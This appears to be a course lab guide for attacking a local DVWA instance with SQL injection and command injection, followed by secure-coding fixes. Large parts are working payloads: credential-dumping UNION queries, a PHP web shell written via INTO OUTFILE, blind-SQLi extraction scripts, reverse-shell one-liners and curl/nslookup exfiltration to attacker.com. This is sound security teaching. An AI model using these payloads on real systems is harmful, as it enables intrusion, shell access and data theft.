# LAB-3.1.5: Hands-on SQLi & Command Injection Exploitation

## Lab Overview

**Course:** BVWS103 – OWASP Top 10 Vulnerabilities & Exploitation Techniques  
**Lab Code:** LAB-3.1.5  
**Lab Title:** Hands-on SQL Injection & Command Injection Exploitation  
**Duration:** 3-4 hours  
**Difficulty:** Intermediate  
**Objectives:** Master SQL injection and command injection techniques, understand their impact, and learn proper mitigation strategies.

---

## ⚠️ CRITICAL ETHICAL WARNING

**This lab contains techniques for exploiting serious security vulnerabilities.**

- **ONLY** perform these exercises in the provided lab environment
- **NEVER** test these techniques on systems you don't own or have explicit written permission to test
- Unauthorized access to computer systems is **ILLEGAL** in most jurisdictions
- By proceeding, you agree to use this knowledge ethically and legally

---

## Lab Introduction

SQL Injection (SQLi) and Command Injection are among the most dangerous web application vulnerabilities. They allow attackers to execute arbitrary code, access sensitive data, and completely compromise systems.

### Learning Objectives

By completing this lab, you will be able to:
- Identify SQL injection vulnerabilities in web applications
- Exploit different types of SQL injection (error-based, union-based, blind)
- Understand and exploit command injection vulnerabilities
- Extract sensitive data from databases
- Implement proper input validation and parameterized queries
- Use security tools for automated vulnerability detection

---

## Lab Setup

### Prerequisites
- Kali Linux VM or similar penetration testing distribution
- DVWA (Damn Vulnerable Web Application) installed
- Basic understanding of SQL and Linux commands
- Burp Suite Community Edition (pre-installed on Kali)

### Lab Environment Setup

```bash
# Install DVWA using Docker
sudo apt update
sudo apt install docker.io docker-compose -y
sudo systemctl start docker
sudo systemctl enable docker

# Pull and run DVWA
sudo docker pull vulnerables/web-dvwa
sudo docker run -d -p 80:80 vulnerables/web-dvwa

# Verify DVWA is running
curl http://localhost

# Access DVWA at: http://localhost
# Default credentials: admin / password
```

### Alternative: Manual DVWA Setup

```bash
# Clone DVWA repository
cd ~/fellowship-labs
git clone https://github.com/digininja/DVWA.git
cd DVWA

# Install dependencies
sudo apt install apache2 mysql-server php php-mysqli php-gd libapache2-mod-php -y

# Configure and start services
sudo systemctl start apache2
sudo systemctl start mysql

# Copy DVWA to web root
sudo cp -r . /var/www/html/dvwa/

# Set permissions
sudo chown -R www-data:www-data /var/www/html/dvwa/
sudo chmod -R 755 /var/www/html/dvwa/

# Access at: http://localhost/dvwa
```

---

## Part 1: Understanding SQL Injection (45 minutes)

### Exercise 1.1: SQL Injection Basics

**What is SQL Injection?**

SQL Injection occurs when an attacker can insert malicious SQL code into application queries, manipulating the database to:
- Bypass authentication
- Extract sensitive data
- Modify or delete data
- Execute administrative operations

**Common Vulnerable Code Pattern:**

```php
// VULNERABLE CODE - DO NOT USE IN PRODUCTION
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($connection, $query);
```

**Attack Example:**

If an attacker enters:
- Username: `admin' --`
- Password: `anything`

The query becomes:
```sql
SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
```

The `--` comments out the rest of the query, bypassing password check!

---

### Exercise 1.2: Identifying SQL Injection Points

**Task 1:** Test for SQL injection in DVWA

```bash
# Access DVWA
# Navigate to: SQL Injection page
# Set security level to: Low

# Test basic injection
# Input: 1' OR '1'='1
# This should return all users

# Test error-based detection
# Input: 1'
# Look for SQL error messages

# Test time-based detection
# Input: 1' AND SLEEP(5) --
# If page delays 5 seconds, it's vulnerable
```

**Common SQL Injection Test Payloads:**

```sql
-- Authentication Bypass
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin' --
admin' #

-- Error-Based Detection
'
"
`
')
")
`)

-- Union-Based Detection
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Time-Based Detection
' AND SLEEP(5)--
' AND BENCHMARK(5000000,MD5('test'))--

-- Boolean-Based Detection
' AND 1=1--
' AND 1=2--
```

---

### Exercise 1.3: Error-Based SQL Injection

**Task 2:** Extract database information using error messages

```sql
-- Step 1: Identify number of columns
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
-- Continue until you get an error

-- Step 2: Find injectable columns
1' UNION SELECT NULL,NULL--

-- Step 3: Extract database version
1' UNION SELECT NULL,@@version--

-- Step 4: Extract database name
1' UNION SELECT NULL,database()--

-- Step 5: Extract table names
1' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()--

-- Step 6: Extract column names
1' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--

-- Step 7: Extract user data
1' UNION SELECT NULL,CONCAT(user,':',password) FROM users--
```

**Lab Exercise:**

1. Access DVWA SQL Injection page (Security: Low)
2. Determine the number of columns in the query
3. Extract the database version
4. List all tables in the database
5. Extract all usernames and password hashes
6. Document each step with screenshots

---

### Exercise 1.4: Union-Based SQL Injection

**Task 3:** Use UNION to extract data from multiple tables

```sql
-- Basic UNION syntax
SELECT column1, column2 FROM table1
UNION
SELECT column1, column2 FROM table2

-- Exploitation steps:

-- 1. Determine column count
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
-- Continue until no error

-- 2. Find data types of columns
1' UNION SELECT 'text',NULL--
1' UNION SELECT NULL,'text'--

-- 3. Extract current user
1' UNION SELECT NULL,user()--

-- 4. Extract all users
1' UNION SELECT NULL,CONCAT(user_id,':',first_name,':',last_name,':',user,':',password) FROM users--

-- 5. Extract specific user
1' UNION SELECT NULL,password FROM users WHERE user='admin'--
```

**Advanced Techniques:**

```sql
-- Group concatenation (get all results in one row)
1' UNION SELECT NULL,GROUP_CONCAT(user,':',password) FROM users--

-- Extract from multiple tables
1' UNION SELECT NULL,CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema=database()--

-- Read files (if permissions allow)
1' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--

-- Write files (if permissions allow)
1' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
```

---

## Part 2: Blind SQL Injection (45 minutes)

### Exercise 2.1: Boolean-Based Blind SQLi

**Scenario:** No error messages or data displayed, but application behavior changes.

**Task 4:** Exploit blind SQL injection

```sql
-- Test if injection works
1' AND '1'='1  -- Returns normal result
1' AND '1'='2  -- Returns different result

-- Extract database name length
1' AND LENGTH(database())=1--  -- False
1' AND LENGTH(database())=2--  -- False
1' AND LENGTH(database())=4--  -- True (dvwa)

-- Extract database name character by character
1' AND SUBSTRING(database(),1,1)='a'--  -- False
1' AND SUBSTRING(database(),1,1)='d'--  -- True
1' AND SUBSTRING(database(),2,1)='v'--  -- True
-- Continue for each character

-- Automate with script
for char in {a..z}; do
    echo "Testing: $char"
    curl "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1'+AND+SUBSTRING(database(),1,1)='$char'--&Submit=Submit" | grep -q "User ID exists"
    if [ $? -eq 0 ]; then
        echo "Found: $char"
        break
    fi
done
```

---

### Exercise 2.2: Time-Based Blind SQLi

**Task 5:** Use time delays to extract data

```sql
-- MySQL time-based payloads
1' AND SLEEP(5)--
1' AND IF(1=1,SLEEP(5),0)--

-- Extract data using timing
1' AND IF(LENGTH(database())=4,SLEEP(5),0)--
1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0)--

-- PostgreSQL
1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Microsoft SQL Server
1'; IF (1=1) WAITFOR DELAY '00:00:05'--
```

**Automation Script:**

```python
#!/usr/bin/env python3
import requests
import time

url = "http://localhost/dvwa/vulnerabilities/sqli_blind/"
cookies = {"security": "low", "PHPSESSID": "your_session_id"}

def time_based_sqli(payload):
    start = time.time()
    requests.get(url, params={"id": payload, "Submit": "Submit"}, cookies=cookies)
    return time.time() - start

# Extract database name length
for length in range(1, 20):
    payload = f"1' AND IF(LENGTH(database())={length},SLEEP(3),0)--"
    duration = time_based_sqli(payload)
    if duration > 3:
        print(f"Database name length: {length}")
        break

# Extract database name
db_name = ""
for pos in range(1, length + 1):
    for char in "abcdefghijklmnopqrstuvwxyz":
        payload = f"1' AND IF(SUBSTRING(database(),{pos},1)='{char}',SLEEP(3),0)--"
        duration = time_based_sqli(payload)
        if duration > 3:
            db_name += char
            print(f"Found character: {char} (position {pos})")
            break

print(f"Database name: {db_name}")
```

---

## Part 3: Command Injection (45 minutes)

### Exercise 3.1: Understanding Command Injection

**What is Command Injection?**

Command injection occurs when an application passes unsafe user input to a system shell, allowing attackers to execute arbitrary OS commands.

**Vulnerable Code Example:**

```php
// VULNERABLE CODE
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);
echo $output;
```

**Attack Example:**

```bash
# Normal use
http://localhost/ping.php?ip=8.8.8.8

# Command injection
http://localhost/ping.php?ip=8.8.8.8;ls
http://localhost/ping.php?ip=8.8.8.8|cat /etc/passwd
http://localhost/ping.php?ip=8.8.8.8`whoami`
```

---

### Exercise 3.2: Exploiting Command Injection in DVWA

**Task 6:** Exploit command injection vulnerability

```bash
# Access DVWA Command Injection page
# Set security level to: Low

# Test basic injection
127.0.0.1; ls

# Common command injection operators
; (semicolon) - Command separator
| (pipe) - Pipe output to next command
|| (double pipe) - Execute if previous fails
& (ampersand) - Background execution
&& (double ampersand) - Execute if previous succeeds
` (backtick) - Command substitution
$() - Command substitution

# Exploitation examples:

# List files
127.0.0.1; ls -la

# Read sensitive files
127.0.0.1; cat /etc/passwd

# Find configuration files
127.0.0.1; find / -name "*.conf" 2>/dev/null

# Check current user
127.0.0.1; whoami

# Check privileges
127.0.0.1; sudo -l

# Network information
127.0.0.1; ifconfig
127.0.0.1; netstat -tuln

# Establish reverse shell
127.0.0.1; nc -e /bin/bash attacker_ip 4444
127.0.0.1; bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

---

### Exercise 3.3: Advanced Command Injection Techniques

**Task 7:** Bypass filters and restrictions

```bash
# Bypass space filtering
127.0.0.1;cat</etc/passwd
127.0.0.1;cat${IFS}/etc/passwd
127.0.0.1;cat$IFS$9/etc/passwd

# Bypass keyword filtering
127.0.0.1;c'a't /etc/passwd
127.0.0.1;c"a"t /etc/passwd
127.0.0.1;ca\t /etc/passwd
127.0.0.1;$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# Bypass using environment variables
127.0.0.1;$USER
127.0.0.1;${PATH}

# Time-based detection
127.0.0.1; sleep 5

# Out-of-band data exfiltration
127.0.0.1; nslookup `whoami`.attacker.com
127.0.0.1; curl http://attacker.com/$(whoami)
```

---

## Part 4: Automated Exploitation (30 minutes)

### Exercise 4.1: Using SQLMap

**Task 8:** Automate SQL injection with SQLMap

```bash
# Install SQLMap (pre-installed on Kali)
sudo apt install sqlmap -y

# Basic SQLMap usage
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session"

# Enumerate databases
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session" --dbs

# Enumerate tables
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session" -D dvwa --tables

# Dump specific table
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session" -D dvwa -T users --dump

# Dump all data
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session" --dump-all

# OS shell (if permissions allow)
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session" --os-shell

# Advanced options
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="security=low; PHPSESSID=your_session" \
    --level=5 \
    --risk=3 \
    --threads=10 \
    --batch
```

---

### Exercise 4.2: Using Burp Suite

**Task 9:** Manual testing with Burp Suite

```bash
# Configure browser to use Burp proxy
# Firefox: Preferences > Network Settings > Manual proxy
# HTTP Proxy: 127.0.0.1, Port: 8080

# Start Burp Suite
burpsuite &

# Steps:
# 1. Navigate to DVWA SQL Injection page
# 2. Intercept request in Burp
# 3. Send to Repeater (Ctrl+R)
# 4. Modify parameter with SQL injection payload
# 5. Observe response
# 6. Send to Intruder for automated testing

# Intruder payload positions:
GET /dvwa/vulnerabilities/sqli/?id=§1§&Submit=Submit HTTP/1.1

# Payload list (in Intruder > Payloads):
1' OR '1'='1
1' UNION SELECT NULL,NULL--
1' AND SLEEP(5)--
```

---

## Part 5: Mitigation and Secure Coding (30 minutes)

### Exercise 5.1: Implementing Secure Code

**Task 10:** Fix vulnerable code

**Vulnerable Code:**

```php
<?php
// VULNERABLE
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($conn, $query);
?>
```

**Secure Code (Prepared Statements):**

```php
<?php
// SECURE - Using Prepared Statements
$id = $_GET['id'];

// Method 1: MySQLi Prepared Statements
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();

// Method 2: PDO Prepared Statements
$pdo = new PDO("mysql:host=localhost;dbname=dvwa", "user", "password");
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
$result = $stmt->fetchAll();
?>
```

**Secure Command Execution:**

```php
<?php
// VULNERABLE
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);

// SECURE - Input Validation
$ip = $_GET['ip'];

// Validate IP address format
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    // Use escapeshellarg for additional safety
    $safe_ip = escapeshellarg($ip);
    $output = shell_exec("ping -c 4 " . $safe_ip);
} else {
    die("Invalid IP address");
}

// BETTER - Use PHP functions instead of shell commands
$ip = $_GET['ip'];
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    exec("ping -c 4 " . escapeshellarg($ip), $output, $return_var);
    echo implode("\n", $output);
}

// BEST - Avoid shell execution entirely when possible
// Use PHP's built-in functions or libraries
?>
```

---

### Exercise 5.2: Defense in Depth

**Security Best Practices:**

1. **Input Validation**
```php
// Whitelist validation
$allowed_ids = [1, 2, 3, 4, 5];
if (in_array($_GET['id'], $allowed_ids)) {
    // Process
}

// Type casting
$id = (int)$_GET['id'];

// Regular expressions
if (preg_match('/^[0-9]+$/', $_GET['id'])) {
    // Process
}
```

2. **Output Encoding**
```php
// HTML encoding
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// URL encoding
echo urlencode($user_input);
```

3. **Least Privilege**
```sql
-- Create limited database user
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON dvwa.* TO 'webapp'@'localhost';
-- Don't grant DELETE, DROP, FILE privileges
```

4. **Web Application Firewall (WAF)**
```bash
# Install ModSecurity
sudo apt install libapache2-mod-security2 -y

# Enable OWASP Core Rule Set
cd /etc/modsecurity
sudo git clone https://github.com/coreruleset/coreruleset.git
sudo mv coreruleset/crs-setup.conf.example crs-setup.conf
```

---

## Verification and Testing

### Lab Challenge

**Scenario:** You've been hired to test a client's web application for SQL injection and command injection vulnerabilities.

**Tasks:**
1. Identify all injection points in DVWA (all security levels)
2. Successfully exploit each vulnerability
3. Extract the following:
   - All user credentials
   - Database version and structure
   - Server OS and version
   - Contents of /etc/passwd
4. Document your methodology
5. Provide remediation recommendations

**Deliverables:**
- Detailed penetration test report
- Proof-of-concept exploits
- Secure code examples
- Remediation priority matrix

---

## Cleanup

```bash
# Stop DVWA container
sudo docker stop $(sudo docker ps -q --filter ancestor=vulnerables/web-dvwa)

# Remove container
sudo docker rm $(sudo docker ps -aq --filter ancestor=vulnerables/web-dvwa)

# Or keep for future practice
echo "Lab completed on $(date)" >> ~/fellowship-labs/lab3.1_completion.txt
```

---

## Submission Requirements

Submit the following:
1. **Lab Report** including:
   - Executive summary
   - Methodology
   - Findings with screenshots
   - Proof-of-concept code
   - Remediation recommendations
2. **SQLMap output** showing successful exploitation
3. **Burp Suite** screenshots of manual testing
4. **Secure code examples** fixing the vulnerabilities
5. **Reflection** (300-500 words) on:
   - Most challenging aspect of the lab
   - Real-world implications of these vulnerabilities
   - Ethical considerations

---

## Additional Resources

### Documentation
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

### Practice Platforms
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [PentesterLab](https://pentesterlab.com/)
- [WebGoat](https://owasp.org/www-project-webgoat/)

### Tools
- [SQLMap](https://sqlmap.org/)
- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Commix](https://github.com/commixproject/commix) - Command injection tool

---

**Lab Version:** 1.0  
**Last Updated:** November 2025  
**Instructor Contact:** resources@aivtic.org.ng

---

**End of Lab Guide**
